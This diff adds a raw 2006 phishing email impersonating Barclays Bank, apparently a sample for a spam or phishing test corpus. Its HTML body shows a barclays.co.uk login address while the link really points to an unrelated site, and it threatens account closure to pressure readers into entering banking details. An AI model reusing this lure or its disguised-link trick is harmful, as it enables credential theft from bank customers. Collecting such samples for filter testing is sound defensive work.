@@ -1,0 +1,130 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id BFB652A898
+ for <user@example.com>; Thu, 19 Jan 2006 11:20:58 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id B82A4621CA5; Thu, 19 Jan 2006 11:20:58 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 5A3BE621C95
+ for <user@example.com>; Thu, 19 Jan 2006 11:20:56 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id LAA32396
+ for user@example.com; Thu, 19 Jan 2006 11:20:54 -0500
+Received: from lts1.smokyhosts.com (114.16.232.72.reverse.layeredtech.com
+ [72.232.16.114] (may be forged))
+ by mail.example.com with ESMTP id LAA32388
+ for <user@example.com>; Thu, 19 Jan 2006 11:20:54 -0500
+Message-Id: <200601191620.LAA32388@mail.example.com>
+Received: from [62.139.196.74] (helo=User)
+ by lts1.smokyhosts.com with esmtpa (Exim 4.52)
+ id 1EzcT9-0001kd-5v; Thu, 19 Jan 2006 10:17:03 -0600
+Reply-To: <Online@barclays.co.uk>
+From: "Barclays Bank PLC." <Online@barclays.co.uk>
+Subject: -Notice- Update Your Information
+Date: Thu, 19 Jan 2006 18:17:02 +0200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - lts1.smokyhosts.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - barclays.co.uk
+To: undisclosed-recipients: ;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 275
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<table border="0" width="100%" id="table1" style="border-collapse: collapse">
+	<tr>
+		<td bgcolor="#003366" background="http://img159.exs.cx/img159/9760/topbk4ac.gif" height="75">
+		<table border="0" width="100%" id="table2" style="border-collapse: collapse">
+			<tr>
+				<td align="right" width="222">
+		<img src="http://www.barclays.co.uk/images_new/home/barclays_logo.gif"></td>
+				<td>
+				<p align="right"><b><font color="#00A8DC" size="2" face="Arial">
+				Important Notice: </font>
+				<font size="2" face="Arial" color="#FFFFFF">Jan, 2006</font><font color="#00A8DC" size="2" face="Arial">&nbsp;&nbsp;&nbsp;&nbsp;
+				</font></b></td>
+			</tr>
+		</table>
+&nbsp;</td>
+	</tr>
+	<tr>
+		<td height="21" align="left">
+		<table border="0" width="62%" id="table3" style="border-collapse: collapse">
+			<tr>
+				<td>&nbsp;</td>
+				<td width="563"><p>
+				<font face="Arial" size="2" color="#003366"><br>
+				Dear Sir/Madam,<br>
+				<br>
+				Barclays Bank PLC. 
+				always look forward for the high security of our clients. Some 
+				customers have been receiving an email claiming to be from 
+				Barclays advising them to follow a link to what appear to be a 
+				Barclays web site, where they are prompted to enter their 
+				personal Online Banking details. Barclays is in no way involved 
+				with this email and the web site does not belong to us.</font></p>
+				<p><font color="#003366" face="Arial" size="2">Barclays is proud 
+				to announce about their new updated secure system. We updated 
+				our new SSL servers to give our customers a better, fast and 
+				secure online banking service.<br>
+				<br>
+				Due to the recent update of the servers, you are requested to 
+				please update your account info at the following link.</font></p>
+				<p><b><font face="Arial" size="2">
+				<a href="http://well4being.com/update/ibank.barclays.co.uk/olb/p/LoginMember.do/">
+				<font color="#00A8DC">
+				https://update.barclays.co.uk/olb/p/LoginMember.do</font></a></font></b></p>
+				<p><font color="#003366" face="Arial" size="2"><b>*Important*</b><br>
+				We have asked few additional information which is going to be 
+				the part of secure login process. These additional information 
+				will be asked during your future login security so, please 
+				provide all these info completely and correctly otherwise due to 
+				security reasons we may have to close your account temporarily.<br>
+				<br>
+&nbsp;</font></p>
+				<p><font face="Arial" size="2"><font color="#003366"><b>J. S. 
+				Smith</b><br>
+				<i>Security Advisor<br>
+				Barclays Bank PLC.</i></font><br>
+&nbsp;</font></td>
+			</tr>
+		</table>
+		<hr size="1">
+		<p><font size="1" face="Arial" color="#808080">Please do not reply to 
+		this e-mail. Mail sent to this address cannot be answered.<br>
+		For assistance, log in to your Barclays Online Bank account and choose 
+		the &quot;Help&quot; link on any page.<br>
+		<br>
+		Barclays Email ID # 1009</font></td>
+	</tr>
+	<tr>
+		<td>&nbsp;</td>
+	</tr>
+</table>
+
+</body>
+
+</html>
